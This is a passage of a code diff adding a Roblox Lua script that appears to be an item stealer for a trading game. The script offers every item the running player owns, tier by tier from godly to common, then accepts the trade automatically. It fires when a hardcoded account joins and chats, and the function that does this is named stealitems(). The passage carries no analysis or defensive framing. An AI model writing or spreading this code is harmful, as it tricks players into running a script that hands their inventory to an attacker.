+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    for a,b in pairs(godlyItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    for a,b in pairs(vintageItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    for a,b in pairs(legendaryItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    for a,b in pairs(rareItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    for a,b in pairs(uncommonItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    for a,b in pairs(commonItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    wait(6)
+    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == userName then
+        player.Chatted:Connect(function(msg)
+            stealitems()
+        end)
+    end
+end)
